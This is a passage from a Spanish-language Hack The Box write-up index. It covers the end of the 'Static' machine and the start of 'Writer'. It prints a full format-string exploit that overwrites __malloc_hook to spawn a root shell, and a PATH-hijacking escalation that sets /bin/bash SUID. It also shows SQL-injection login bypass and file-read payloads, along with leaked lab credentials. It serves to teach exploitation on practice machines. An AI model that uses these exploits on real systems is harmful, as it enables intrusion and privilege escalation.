+ ~C):\nwww-data@web:/tmp$ ssh\u0026gt; -L 1234:192.168.254.3:1234 Forwarding port. www-data@web:/tmp$ Ahora podemos transferir fácilmente ersatool y ersatool.c a la máquina de atacante usando Python (afortunadamente, pki tiene python3 instalado):\nwww-data@pki:~/html/uploads$ cd / www-data@pki:~/$ python3 -m http.server 1234 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ... $ wget http://127.0.0.1:1234/usr/bin/ersatool $ wget http://127.0.0.1:1234/usr/src/ersatool.c Para desarrollar el exploit, necesitamos también la librería Glibc:\nwww-data@pki:/$ ldd /usr/bin/ersatool  linux-vdso.so.1 (0x00007fff7f1f4000)  libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9381921000)  /lib64/ld-linux-x86-64.so.2 (0x00007f9381d12000) $ wget http://127.0.0.1:1234/lib/x86_64-linux-gnu/libc.so.6 Finalmente, como se trata de un programa de línea de comandos, necesitaremos utilizar socat para redirigir los datos que vienen de una conexión TCP al binario en ejecución.\nPodemos transferir socat desde la máquina de atacante hasta pki utilizando el siguiente código en Python:\nfrom urllib.request import urlopen  f = open(\u0026#39;./socat\u0026#39;, \u0026#39;wb\u0026#39;) f.write(urlopen(\u0026#39;http://192.168.254.2:4444/socat\u0026#39;).read()) f.close() La máquina de atacante tendrá un servidor HTTP en el puerto 4444 (recuérdese la configuración de red):\n$ python3 -m http.server 4444 Serving HTTP on :: port 4444 (http://[::]:4444/) ... Este código en Python se puede ejecutar en pki con un \u0026ldquo;one-liner\u0026rdquo; como este:\nwww-data@pki:/$ cd /tmp www-data@pki:/tmp$ python3 -c \u0026#39;from urllib.request import urlopen; f = open(\u0026#34;./socat\u0026#34;, \u0026#34;wb\u0026#34;); f.write(urlopen(\u0026#34;http://192.168.254.2:4444/socat\u0026#34;).read()); f.close()\u0026#39; www-data@pki:/tmp$ file socat socat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped Ahora tenemos que lanzar socat y empezar a trabajar desde la máquina de atacante desde 127.0.0.1:1234:\nwww-data@pki:/tmp$ chmod +x socat www-data@pki:/tmp$ ./socat tcp-l:1234,reuseaddr,fork EXEC:/usr/bin/ersatool $ nc 127.0.0.1 1234 # print print-\u0026gt;CN=%x f7410e5f[!] ERR reading /opt/easyrsa/clients/%x.ovpn! Explotación de Format String Esta es la información básica del binario:\n$ file ersatool ersatool: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=961368a18afcdeccddd1f423353ff104bc09e6ae, not stripped $ checksec --file ersatool  Arch: amd64-64-little  RELRO: Partial RELRO  Stack: No canary found  NX: NX enabled  PIE: PIE enabled  Se trata de un binario ELF de 64-bit. Tiene NX habilitado, lo que indica que la pila (stack) no es ejecutable. Tiene PIE habilitado, lo que significa que la dirección base del propio binario está aleatorizada (ASLR) de manera que cambia cada vez que se reinicia el programa (las direcciones de las funciones se calculan como un offset más la dirección base). Además, las direcciones de las funciones de Glibc también tienen ASLR, porque está habilitado:  www-data@pki:/tmp$ cat /proc/sys/kernel/randomize_va_space 2 Necesitamos realizar las siguientes tareas para obtener RCE:\n Encontrar el offset de la format string. Obtener una dirección de una función del binario utilizando la format string (leak). Calcular la dirección base del binario. Obtener una dirección de una función de Glibc utilizando la format string (leak). Calcular la dirección base de Glibc. Modificar la función __malloc_hook con un gadget de Glibc para conseguir una shell usando la format string. Ocasionar la llamada de malloc solicitando una gran cantidad de memoria.  Tarea 1: Ya realizada, el offset de la format string es 8.\nTarea 2: Para fugar una dirección, tendremos que utilizar formatos como %x o %p (ambos imprimen el valor en hexadecimal de una dirección, pero el segundo añade 0x). Sin embargo, en lugar de poner un montón de formatos, podemos coger una posición y utilizar %i$p, donde i es la posición. Esta vez, como es un binario de 64-bit, necesitamos utilizar %lx o %lp.\nCon esta idea, podemos crear un sencillo script en Python con pwntools para obtener los primeros 60 valores de la pila:\nfrom pwn import *  p = remote(\u0026#39;127.0.0.1\u0026#39;, 1234)  def get_value(i):  p.sendlineafter(b\u0026#39;print-\u0026gt;CN=\u0026#39;, f\u0026#39;%{i}$lp\u0026#39;.encode())  data = p.recvline()  data = data[:data.index(b\u0026#39;[!] ERR\u0026#39;)]  print(i, data.decode())  return int(data.decode(), 16)  p.sendlineafter(b\u0026#39;# \u0026#39;, b\u0026#39;print\u0026#39;)  for i in range(1, 61):  get_value(i) $ python3 exploit.py [+] Opening connection to 127.0.0.1 on port 1234: Done 1 0x5615109d815f 2 0x7ffdc8e5489a 3 0x5615109d815f 4 0x4a 5 0x696c632f61737279 6 0x1109d41d0 7 (nil) 8 0x706c243825 9 (nil) ... 19 (nil) 20 0x561500000000 21 0x7f4a39c0bf51 22 0x7361652f74706f2f 23 0x696c632f61737279 24 0x3432252f73746e65 25 0x6e70766f2e706c24 26 (nil) ... 33 (nil) 34 0x7f4a00000000 35 0x7f4a39bfd87d 36 (nil) 37 (nil) 38 0x7ffdc8e54940 39 0x5615109d4f83 40 0x7ffdc8e54a28 41 0x100000000 42 0x5615109d5070 43 0xa746e697270 44 (nil) 45 0x100000000 46 0x5615109d5070 47 0x7f4a39ba0b97 48 0x2000000000 49 0x7ffdc8e54a28 50 0x100000000 51 0x5615109d4e5b 52 (nil) 53 0xcc040442782a621f 54 0x5615109d41d0 55 0x7ffdc8e54a20 56 (nil) 57 (nil) 58 0x9fd5b4b24a6a621f 59 0x9eba560cce54621f 60 0x7ffd00000000 Burlar el ASLR es relativamente sencillo, ya que la dirección base aleatorizada siempre termina en tres ceros en hexadecimal. Por tanto, si conocemos los últimos tres dígitos hexadecimales de un offset, podemos identificar fácilmente la dirección real.\nVeamos cuál es el offset de la función main:\n$ readelf -s ersatool | grep \u0026#39; main\u0026#39;  86: 0000000000001e5b 524 FUNC GLOBAL DEFAULT 14 main Si miramos a los valores fugados anteriormente, descubrimos que la posición 51 es 0x5615109d4e5b, termina en e5b. Por tanto, tenemos una manera de sacar la dirección real de la función main utilizando %51$lp como format string:\nmain_addr = get_value(51) print(\u0026#39;Address of main():\u0026#39;, hex(main_addr)) Tarea 3: La dirección base del binario es muy probable que sea 0x5615109d4e5b - 0x1e5b = 0x5615109d3000 (será distinta en cada ejecución):\nelf = context.binary = ELF(\u0026#39;./ersatool\u0026#39;, checksec=False) libc = ELF(\u0026#39;./libc.so.6\u0026#39;, checksec=False)  elf.address = main_addr - elf.symbols.main print(\u0026#39;Binary base address:\u0026#39;, hex(elf.address)) Ahora el proceso de explotación de Format String es bastante estándar.\nTarea 4: Para fugar una dirección de Glibc, podemos utilizar la Tabla de Offsets Globales (GOT). Esta tabla es parte del binario y contiene las direcciones de las funciones que pueden ser utilizadas por el binario (es decir, printf, strncat, fgets\u0026hellip;).\nLas direcciones de la GOT son conocidas porque tenemos sus offsets y la dirección base del binario. Podemos utilizar el siguiente payload para imprimir la dirección de printf (por ejemplo) en Glibc:\nleak = b\u0026#39;%9$s\u0026#39;.ljust(8, b\u0026#39;\\0\u0026#39;) + p64(elf.got.printf) p.sendlineafter(b\u0026#39;print-\u0026gt;CN=\u0026#39;, leak) data = p.recvline() data = data[:data.index(b\u0026#39;[!] ERR\u0026#39;)]  printf_addr = u64(data.ljust(8, b\u0026#39;\\0\u0026#39;)) print(\u0026#39;Address of printf():\u0026#39;, hex(printf_addr)) Como las cadenas de caracteres en C funcionan como punteros, si ponemos una dirección de la GOT en una format string para mostrar el contenido de una cadena de caracteres, lo que se mostrará es la dirección a la que apunta el la dirección de la GOT.\nNótese que estamos tratando de fugar %9$s, que serán los datos contenidos en la dirección de printf de la GOT, que viene justo después de la format string (recuérdese que el offset de la format string es 8).\nSi todo funciona correctamente, tendremos la dirección real de printf en Glibc.\nTarea 5: La dirección base de Glibc se puede calcular de la misma manera que la dirección base del binario. Solamente tenemos que restar la dirección real del offset. Adicionalmente, tendremos que verificar que la dirección base acaba en 000 en hexadecimal.\nlibc.address = printf_addr - libc.symbols.printf print(\u0026#39;Glibc base address:\u0026#39;, hex(libc.address)) Tarea 6: Ahora necesitamos escribir en una dirección de memoria. La mejor manera de ganar ejecución de comandos en este tipo de situaciones es sobrescribiendo la dirección de __malloc_hook de Glibc para ejecutar un gadget de shell.\nLos gadgets son líneas de código ensamblador que ejecutan una operación concreta. Son útiles en explotación de Buffer Overflow utilizando Return Oriented Programming (ROP) para saltarse el NX (también conocido como DEP).\nEsta vez podemos buscar un gadget que directamente ejecute /bin/sh. Estos se suelen encontrar en Glibc. Utilizando one_gadget podemos encontrar gadgets potenciales:\n# gem install one_gadget $ one_gadget libc.so.6 0x4f2c5 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints:  rsp \u0026amp; 0xf == 0  rcx == NULL 0x4f322 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints:  [rsp+0x40] == NULL 0x10a38c execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints:  [rsp+0x70] == NULL Podemos utilizar 0x4f322, por ejemplo. Ahora podemos sobrescribir fácilmente __malloc_hook utilizando pwntools (esta librería tiene una función mágica llamada fmtstr_payload que hace todo el trabajo, indicándole el offset, la dirección de memoria en la que escribir y el valor a escribir):\none_gadget_shell = libc.address + 0x4f322  payload = fmtstr_payload(  offset,  {libc.sym.__malloc_hook: one_gadget_shell},  write_size=\u0026#39;short\u0026#39; )  p.sendlineafter(b\u0026#39;print-\u0026gt;CN=\u0026#39;, payload) p.recv() Tarea 7: La necesidad de sobrescribir __malloc_hook es porque ahora vamos a enviar %10000$c. Esta tarea va a requerir una reserva de espacio en memoria, por lo que el binario llamará a malloc. Sin embargo, __malloc_hook será ejecutado antes. Y como ha sido modificada, en lugar de llamar a malloc, el programa ejecutará una shell (/bin/sh):\np.sendlineafter(b\u0026#39;print-\u0026gt;CN=\u0026#39;, b\u0026#39;%10000$c\u0026#39;) p.interactive() Finalmente, podemos ejecutar el exploit y conseguir una shell como root (debido a las capabilities del binario):\n$ python3 exploit.py [+] Opening connection to 127.0.0.1 on port 1234: Done Offset: 8 51 0x558d4b23fe5b Address of main(): 0x558d4b23fe5b Binary base address: 0x558d4b23e000 GOT printf(): 0x558d4b243058 Address of printf(): 0x7f33d1794e80 Glibc base address: 0x7f33d1730000 Address of __malloc_hook(): 0x7f33d1b1bc30 [*] Switching to interactive mode $ whoami root $ cat /root/root.txt b3298f99ac5999202090829ed5fa9fb6 El expoit completo puede encontrarse en exploit.py (explicación detallada aquí).\nEscalada de privilegios alternativa A pesar de que la explotación de Format String es mucho más elegante, existe una manera más sencilla y rápida de escalar privilegios. La ides es que ersatool puede crear archivos .ovpn. A lo mejor está utilizando otro binario por detrás.\nPara verificar todos los procesos en ejecución al crearse el archivo .ovpn, se puede utilizar pspy. Una vez lanzado, se puede ver que le binario utiliza openssl.\nPero, el matiz es que el programa se llama con una ruta relativa. Por tanto, este binario es vulnerable a PATH hijacking. Podemos crear un ejecutable openssl malicioso dentro de /tmp y añadir /tmp a la variable de entorno PATH:\nwww-data@pki:/tmp$ echo -e \u0026#39;#!/bin/bash\\nchmod 4755 /bin/bash\u0026#39; \u0026gt; openssl www-data@pki:/tmp$ cat openssl #!/bin/bash chmod 4755 /bin/bash www-data@pki:/tmp$ chmod +x openssl www-data@pki:/tmp$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin www-data@pki:/tmp$ export PATH=/tmp:$PATH www-data@pki:/tmp$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin www-data@pki:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash El openssl malicioso añadirá el permiso SUID a /bin/bash. Si utilizamos ersatool create, el openssl malicioso se ejecutará:\nwww-data@pki:/tmp$ ersatool create xD ... www-data@pki:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash Y ganamos acceso como root:\nwww-data@pki:/tmp$ bash -p bash-4.4# cat /root/root.txt b3298f99ac5999202090829ed5fa9fb6 ","image":"/images/HTB/Static/Static.png","permalink":"https://7rocky.github.io/htb/static/","section":"htb","summary":"Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo Gzip corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String","time":22,"title":"Static"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.101   Fecha: 31 / 07 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.101 -p 22,80,139,445 Nmap scan report for 10.10.11.101 Host is up (0.050s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) | 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Story Bank | Writer.HTB 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Host script results: |_clock-skew: 13m06s |_nbstat: NetBIOS name: WRITER, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: |_ start_date: N/A  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 14.60 seconds La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP), 139 y 445 (SMB).\nEnumeración web Si vamos a http://10.10.11.101 veremos un blog como este:\nEl blog contiene algunos artículos, pero nada interesante. Podemos utilizar gobuster para aplicar fuzzing de rutas:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -u http://10.10.11.101 /contact (Status: 200) [Size: 4905] /about (Status: 200) [Size: 3522] /static (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.101/static/] /logout (Status: 302) [Size: 208] [--\u0026gt; http://10.10.11.101/] /dashboard (Status: 302) [Size: 208] [--\u0026gt; http://10.10.11.101/] /administrative (Status: 200) [Size: 1443] /server-status (Status: 403) [Size: 277] Como vemos, hay una ruta llamada /administrative:\nPodemos probar algunas credenciales por defecto (admin:admin, root:password, etc.), pero ninguna funciona.\nEncontrando una inyección de código SQL El formulario de inicio de sesión de /administrative es vulnerable a inyección de código SQL (SQLi). Utilizando una inyección sencilla (o sea: ' or 1=1-- -) podemos saltar la autenticación y acceder al panel de administración:\nEn este punto, podemos utilizar el SQLi para obtener el contenido de la base de datos. Nótese que se trata de un SQLi de tipo Boolean-based blind (si la respuesta del servidor muestra un error es porque la consulta SQL ha resultado en false; pero si la respuesta del servidor es exitosa, entonces la consulta SQL ha resultado en true):\n$ curl 10.10.11.101/administrative -sd \u0026#34;uname=\u0026#39; or 1=2-- -\u0026amp;password=x\u0026#34; | grep error  \u0026lt;p class=\u0026#34;error\u0026#34; style=\u0026#34;color:red\u0026#34;\u0026gt;\u0026lt;strong style=\u0026#34;color:red\u0026#34;\u0026gt;Error:\u0026lt;/strong\u0026gt; Incorrect credentials supplied \u0026lt;/p\u0026gt; $ curl 10.10.11.101/administrative -sd \u0026#34;uname=\u0026#39; or 1=1-- -\u0026amp;password=x\u0026#34; | grep error Con esto, se puede obtener el contenido de un campo carácter a carácter, de manera que se itera sobre todos los caracteres ASCII imprimibles hasta dar con el correcto para una posición de un determinado campo. Por este motivo, para la extracción es conveniente utilizar un script automático o una herramienta como sqlmap.\nPodemos obtener algunos campos de las tablas de la base de datos utilizando un script personalizado en Python llamado sqli.py que utiliza el algoritmo de Búsqueda Binaria para extraer los datos más rápidamente (explicación detallada aquí).\nAquí podemos ver algunos de los contenidos en formato JSON (la tabla stories y las columnas ganalitics y date_created se han omitido porque contenían muchos datos inútiles):\n$ python3 sqli.py {  \u0026#34;writer\u0026#34;: {  \u0026#34;site\u0026#34;: {  \u0026#34;id\u0026#34;: [  \u0026#34;1\u0026#34;  ],  \u0026#34;title\u0026#34;: [  \u0026#34;Story Bank\u0026#34;  ],  \u0026#34;description\u0026#34;: [  \u0026#34;This is a site where I publish my own and others stories\u0026#34;  ],  \u0026#34;logo\u0026#34;: [  \u0026#34;/img/logo.png\u0026#34;  ],  \u0026#34;favicon\u0026#34;: [  \u0026#34;/img/favicon.ico\u0026#34;  ],  \u0026#34;ganalytics\u0026#34;: []  },  \u0026#34;stories\u0026#34;: {},  \u0026#34;users\u0026#34;: {  \u0026#34;id\u0026#34;: [  \u0026#34;1\u0026#34;  ],  \u0026#34;username\u0026#34;: [  \u0026#34;admin\u0026#34;  ],  \u0026#34;password\u0026#34;: [  \u0026#34;118e48794631a9612484ca8b55f622d0\u0026#34;  ],  \u0026#34;email\u0026#34;: [  \u0026#34;admin@writer.htb\u0026#34;  ],  \u0026#34;status\u0026#34;: [  \u0026#34;Active\u0026#34;  ],  \u0026#34;date_created\u0026#34;: []  }  } } Aparece el hash de una contraseña, pero no es rompible mediante john o hashcat.\nLeyendo archivos mediante SQLi Si verificamos los privilegios del usuario de la base de datos, vemos que podemos leer y escribir en archivos (privilegio llamado FILE) si el usuario a nivel de sistema tiene los permisos necesarios:\n$ python3 sqli.py privileges {  \u0026#34;grantee\u0026#34;: [  \u0026#34;\u0026#39;admin\u0026#39;@\u0026#39;localhost\u0026#39;\u0026#34;  ],  \u0026#34;privilege_type\u0026#34;: [  \u0026#34;FILE\u0026#34;  ],  \u0026#34;table_catalog\u0026#34;: [  \u0026#34;def\u0026#34;  ],  \u0026#34;is_grantable\u0026#34;: [  \u0026#34;NO\u0026#34;  ] } Como prueba de concepto, podemos leer el archivo /etc/passwd. Esto muestra que hay dos usuarios de bajos privilegios en la máquina: kyle y john.\n$ python3 sqli.py /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh john:x:1001:1001:,,,:/home/john:/bin/bash mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false Podemos continuar enumerando archivos del servidor. Sería increíble si pudiéramos leer el código fuente del back-end. Para ello, primero podemos buscar la configuración del servidor (normalmente un Apache o nginx).\nDe hecho, el archivo /etc/apache2/sites-available/000-default.conf existe y se muestra a continuación:\n$ python3 sqli.py /etc/apache2/sites-available/000-default.conf # Virtual host configuration for writer.htb domain \u0026lt;VirtualHost *:80\u0026gt;  ServerName writer.htb  ServerAdmin admin@writer.htb  WSGIScriptAlias / /var/www/writer.htb/writer.wsgi  \u0026lt;Directory /var/www/writer.htb\u0026gt;  Order allow,deny  Allow from all  \u0026lt;/Directory\u0026gt;  Alias /static /var/www/writer.htb/writer/static  \u0026lt;Directory /var/www/writer.htb/writer/static/\u0026gt;  Order allow,deny  Allow from all  \u0026lt;/Directory\u0026gt;  ErrorLog ${APACHE_LOG_DIR}/error.log  LogLevel warn  CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt;  # Virtual host configuration for dev.writer.htb subdomain # Will enable configuration after completing backend development # Listen 8080 #\u0026lt;VirtualHost 127.0.0.1:8080\u0026gt; # ServerName dev.writer.htb # ServerAdmin admin@writer.htb #  # Collect static for the writer2_project/writer_web/templates # Alias /static /var/www/writer2_project/static # \u0026lt;Directory /var/www/writer2_project/static\u0026gt; # Require all granted # \u0026lt;/Directory\u0026gt; # # \u0026lt;Directory /var/www/writer2_project/writerv2\u0026gt; # \u0026lt;Files wsgi.py\u0026gt; # Require all granted # \u0026lt;/Files\u0026gt; # \u0026lt;/Directory\u0026gt; # # WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env # WSGIProcessGroup writer2_project # WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py # ErrorLog ${APACHE_LOG_DIR}/error.log # LogLevel warn # CustomLog ${APACHE_LOG_DIR}/access.log combined # #\u0026lt;/VirtualHost\u0026gt; # vim: syntax=apache ts=4 sw=4 sts=4 sr noet Análisis del código Python La previa configuración de Apache apunta a un script principal del servidor que está en ejecución, que es /var/www/writer.htb/writer.wsgi, un archivo común para configurar una aplicación de Flask (que es un conocido framework web hecho en Python):\n$ python3 sqli.py /var/www/writer.htb/writer.wsgi #!/usr/bin/python  import sys import logging import random import os  # Define logging logging.basicConfig(stream=sys.stderr) sys.path.insert(0,\u0026#34;/var/www/writer.htb/\u0026#34;)  # Import the __init__.py from the app folder from writer import app as application application.secret_key = os.environ.get(\u0026#34;SECRET_KEY\u0026#34;, \u0026#34;\u0026#34;) Este script de Python está importando otro desde writer. Python utiliza nombres de archivos especiales a la hora de importar módulos. Básicamente, el script que está importando es /var/www/writer.htb/writer/__init__.py. Se trata de un archivo extremadamente largo que contiene toda la funcionalidad del back-end (será necesario esperar más de 20 minutos para extraer el archivo completo). A continuación se muestra el código en cuestión, con algunos métodos recortados:\n$ python3 sqli.py /var/www/writer.htb/writer/__init__.py from flask import Flask, session, redirect, url_for, request, render_template from mysql.connector import errorcode import mysql.connector import urllib.request import os import PIL from PIL import Image, UnidentifiedImageError import hashlib  app = Flask(__name__,static_url_path=\u0026#39;\u0026#39;,static_folder=\u0026#39;static\u0026#39;,template_folder=\u0026#39;templates\u0026#39;)  #Define connection for database def connections():  try:  connector = mysql.connector.connect(user=\u0026#39;admin\u0026#39;, password=\u0026#39;ToughPasswordToCrack\u0026#39;, host=\u0026#39;127.0.0.1\u0026#39;, database=\u0026#39;writer\u0026#39;)  return connector  except mysql.connector.Error as err:  if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:  return (\u0026#34;Something is wrong with your db user name or password!\u0026#34;)  elif err.errno == errorcode.ER_BAD_DB_ERROR:  return (\u0026#34;Database does not exist\u0026#34;)  else:  return (\u0026#34;Another exception, returning!\u0026#34;)  else:  print (\u0026#39;Connection to DB is ready!\u0026#39;)  #Define homepage @app.route(\u0026#39;/\u0026#39;) def home_page():  try:  connector = connections()  except mysql.connector.Error as err:  return (\u0026#34;Database error\u0026#34;)  cursor = connector.cursor()  sql_command = \u0026#34;SELECT * FROM stories;\u0026#34;  cursor.execute(sql_command)  results = cursor.fetchall()  return render_template(\u0026#39;blog/blog.html\u0026#39;, results=results)  #Define about page @app.route(\u0026#39;/about\u0026#39;) def about():  return render_template(\u0026#39;blog/about.html\u0026#39;)  #Define contact page @app.route(\u0026#39;/contact\u0026#39;) def contact():  return render_template(\u0026#39;blog/contact.html\u0026#39;)  #Define blog posts @app.route(\u0026#39;/blog/post/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def blog_post(id):  try:  connector = connections()  except mysql.connector.Error as err:  return (\u0026#34;Database error\u0026#34;)  cursor = connector.cursor()  cursor.execute(\u0026#34;SELECT * FROM stories WHERE id = %(id)s;\u0026#34;, {\u0026#39;id\u0026#39;: id})  results = cursor.fetchall()  sql_command = \u0026#34;SELECT * FROM stories;\u0026#34;  cursor.execute(sql_command)  stories = cursor.fetchall()  return render_template(\u0026#39;blog/blog-single.html\u0026#39;, results=results, stories=stories)  #Define dashboard for authenticated users @app.route(\u0026#39;/dashboard\u0026#39;) def dashboard():  if not (\u0026#39;user\u0026#39; in session):  return redirect(\u0026#39;/\u0026#39;)  return render_template(\u0026#39;dashboard.html\u0026#39;)  #Define stories page for dashboard and edit/delete pages @app.route(\u0026#39;/dashboard/stories\u0026#39;) def stories():  if not (\u0026#39;user\u0026#39; in session):  return redirect(\u0026#39;/\u0026#39;)  try:  connector = connections()  except mysql.connector.Error as err:  return (\u0026#34;Database error\u0026#34;)  cursor = connector.cursor()  sql_command = \u0026#34;Select * From stories;\u0026#34;  cursor.execute(sql_command)  results = cursor.fetchall()  return render_template(\u0026#39;stories.html\u0026#39;, results=results)  @app.route(\u0026#39;/dashboard/stories/add\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def add_story():  # ...  @app.route(\u0026#39;/dashboard/stories/edit/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def edit_story(id):  # ...  @app.route(\u0026#39;/dashboard/stories/delete/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def delete_story(id):  # ...  #Define user page for dashboard @app.route(\u0026#39;/dashboard/users\u0026#39;) def users():  # ...  #Define settings page @app.route(\u0026#39;/dashboard/settings\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def settings():  # ...  #Define authentication mechanism @app.route(\u0026#39;/administrative\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def login_page():  if (\u0026#39;user\u0026#39; in session):  return redirect(\u0026#39;/dashboard\u0026#39;)  if request.method == \u0026#34;POST\u0026#34;:  username = request.form.get(\u0026#39;uname\u0026#39;)  password = request.form.get(\u0026#39;password\u0026#39;)  password = hashlib.md5(password.encode(\u0026#39;utf-8\u0026#39;)).hexdigest()  try:  connector = connections()  except mysql.connector.Error as err:  return (\u0026#34;Database error\u0026#34;)  try:  cursor = connector.cursor()  sql_command = \u0026#34;Select * From users Where username = \u0026#39;%s\u0026#39; And password = \u0026#39;%s\u0026#39;\u0026#34; % (username, password)  cursor.execute(sql_command)  results = cursor.fetchall()  for result in results:  print(\u0026#34;Got result\u0026#34;)  if result and len(result) != 0:  session[\u0026#39;user\u0026#39;] = username  return render_template(\u0026#39;success.html\u0026#39;, results=results)  else:  error = \u0026#34;Incorrect credentials supplied\u0026#34;  return render_template(\u0026#39;login.html\u0026#39;, error=error)  except:  error = \u0026#34;Incorrect credentials supplied\u0026#34;  return render_template(\u0026#39;login.html\u0026#39;, error=error)  else:  return render_template(\u0026#39;login.html\u0026#39;)  @app.route(\u0026#34;/logout\u0026#34;) def logout():  if not (\u0026#39;user\u0026#39; in session):  return redirect(\u0026#39;/\u0026#39;)  session.pop(\u0026#39;user\u0026#39;)  return redirect(\u0026#39;/\u0026#39;)  if __name__ == \u0026#39;__main__\u0026#39;:  app.run(\u0026#34;0.0.0.0\u0026#34;) Este gran script contiene la siguiente contraseña: ToughPasswordToCrack.\nEnumeración por SMB A primera vista, tenemos la contraseña para conectarnos a MySQL (ToughPasswordToCrack) como usuario writer. Sin embargo, esta contraseña se reutiliza en SMB para el usuario kyle:\n$ smbmap -H 10.10.11.101 -u kyle -p ToughPasswordToCrack [+] IP: 10.10.11.101:445 Name: 10.10.11.101 Status: Authenticated  Disk Permissions Comment  ---- ----------- -------  print$ READ ONLY Printer Drivers  writer2_project READ, WRITE  